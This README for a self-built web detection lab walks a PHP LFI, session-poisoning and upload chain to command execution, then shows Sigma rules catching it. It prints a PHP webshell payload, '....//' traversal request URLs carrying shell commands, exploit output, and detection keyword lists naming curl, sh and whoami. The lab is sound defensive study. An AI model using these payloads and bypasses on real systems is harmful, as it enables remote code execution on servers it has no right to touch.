# Web RCE detection lab

Build the attack, then build the detection. This repository holds a small, deliberately vulnerable PHP application, a script that chains its weaknesses into command execution, Sigma rules that flag each step, and the unedited logs from running both.

I know the offensive chain (file upload, Local File Inclusion, PHP session poisoning) from certification work. I built this to see the same chain from the log side and to check that rules written against it fire on real traffic rather than on paper.

## What is in here

```
lab/         the vulnerable app and a run script (PHP built-in server)
attack/      exploit.py: session-poisoning path or upload path, both end in command execution
detection/   five Sigma rules, plus check_logs.py, a plain-Python runner for the four web rules
evidence/    access log, detector output and exploit output from my run (user and host names redacted)
```

## The chain

The app has three weaknesses that each look minor on their own:

- `index.php` includes a page named by `?page=` after stripping `../` once. The non-recursive filter lets `....//` through, which becomes `../` after the strip.
- The app stores the raw `User-Agent` header in the PHP session, so a header I control is written to `sessions/sess_<id>` on disk.
- `upload.php` is authenticated and checks the extension against a denylist. The denylist looks at the name, not the content.

```
 User-Agent: <?php ... ?>      or      upload notes.txt (PHP inside, .txt outside)
            |                                     |
            v                                     v
 sessions/sess_<id> holds PHP            uploads/notes.txt holds PHP
            |                                     |
            +------------------+------------------+
                               v
         GET /index.php?page=....//....//sessions/sess_<id>&c=id
                               v
                    include() executes the planted PHP, system() runs the command
```

## Run it

Requires PHP 8 and Python 3 with `requests`. I verified it on PHP 8.5.9 on macOS; the app contains nothing platform specific.

```
./lab/run.sh                                          # terminal 1: serves on 127.0.0.1:8080, logs to lab/logs/access.log
python3 attack/exploit.py                             # terminal 2: session-poisoning path, runs `id`
python3 attack/exploit.py --mode upload --cmd "uname -a"
python3 detection/check_logs.py lab/logs/access.log   # run the web rules over the log you just produced
```

## What happened when I ran it

Session path. The payload went in through the `User-Agent` header, the session file on disk then contained it verbatim, and the include executed it:

```
[1] session id d84ba730dd9169596eeb38cf9be4770e -> server will write sessions/sess_d84ba730dd9169596eeb38cf9be4770e
[2] planted PHP in the session file via the User-Agent header
[3] GET /index.php?page=....//....//sessions/sess_d84ba730dd9169596eeb38cf9be4770e&c=id -> HTTP 200
[+] command output:
ua|s:28:"uid=501(<user>) gid=20(staff) groups=20(staff),12(everyone),...
```

```
$ head -c 120 lab/sessions/sess_d84ba730dd9169596eeb38cf9be4770e
ua|s:28:"<?php system($_GET['c']); ?>";
```

Upload path. A `.txt` passed the denylist and the same include ran it:

```
[2] uploaded notes.txt containing PHP; the extension passed the denylist
[3] GET /index.php?page=....//uploads/notes.txt&c=uname -a -> HTTP 200
[+] command output:
Darwin <host> 25.6.0 Darwin Kernel Version 25.6.0 ... arm64
```

Then the detector over the real log:

```
[web_lfi_path_traversal] T1190
    GET /index.php?page=....//....//sessions/sess_d84ba730dd9169596eeb38cf9be4770e&c=id  -> 200
[web_php_session_file_include] T1190, T1505.003
    GET /index.php?page=....//....//sessions/sess_d84ba730dd9169596eeb38cf9be4770e&c=id  -> 200
[web_webshell_command_parameter] T1059, T1505.003
    GET /index.php?page=....//....//sessions/sess_d84ba730dd9169596eeb38cf9be4770e&c=id  -> 200
[web_lfi_path_traversal] T1190
    GET /index.php?page=....//uploads/notes.txt&c=uname%20-a  -> 200
[web_include_of_upload_dir] T1505.003
    GET /index.php?page=....//uploads/notes.txt&c=uname%20-a  -> 200
[web_webshell_command_parameter] T1059, T1505.003
    GET /index.php?page=....//uploads/notes.txt&c=uname%20-a  -> 200

9 request lines scanned, 6 rule hits
```

Nine requests were logged. The two attack requests produced all six hits. The seven benign ones (home page loads, the login POST, the upload POST) produced none. The full files are in `evidence/`.

## The rules

| Rule | What it catches | ATT&CK | Fired in my run |
|---|---|---|---|
| `web_lfi_path_traversal` | `../`, `..%2f`, the `....//` bypass, `php://` wrappers in the query | T1190 | yes, both requests |
| `web_php_session_file_include` | a request naming `sess_` in a parameter | T1190, T1505.003 | yes |
| `web_include_of_upload_dir` | an include-style parameter pointing into `uploads/` | T1505.003 | yes |
| `web_webshell_command_parameter` | `c=`, `cmd=`, `exec=` carrying `id`, `whoami`, `curl`, `sh`... | T1059, T1505.003 | yes, both requests |
| `proc_webserver_spawns_shell` | the PHP or web server process starting `sh`, `id`, `curl`... | T1059.004, T1505.003 | not captured here |

The last rule is the strongest signal in the chain and the one I could not record on this run. The lab ran on macOS with no process auditing, so there is no process-creation telemetry to show. It is written for a Linux host; to capture it, run the lab on Linux with either of these and point the rule at the resulting events:

- auditd: `auditctl -a always,exit -F arch=b64 -S execve -k exec`, then look for `execve` records whose parent is the `php` process.
- Sysmon for Linux: event ID 1 (ProcessCreate) with `ParentImage` ending in `/php`.

## Why the process rule matters

The upload POST left no trace the web rules can see. The malicious content travelled in the request body, and the URL was an ordinary `POST /upload.php`. Only the later include request gave it away. A web-tier detection therefore depends on the attacker touching the file through a visible parameter. The process rule does not care how the file got there or what the URL looked like: a web server starting a shell is wrong on its own. That is the detection I would want in place first.

## What I took from this

Writing the rules was the easy part. Running them against traffic I generated showed me which step is loud (the include with a command parameter) and which is nearly silent (the upload itself), and it made the case for host-level telemetry in a way reading about it did not.

## Fixes, for completeness

Allowlist the include target instead of filtering the input. Never store raw request headers in the session. Allowlist upload extensions, check content, and store uploads outside the web root under random names.

---

Scope: every request here went to a lab I built and run on my own machine. No third-party systems were involved and the repository contains no certification exam material.
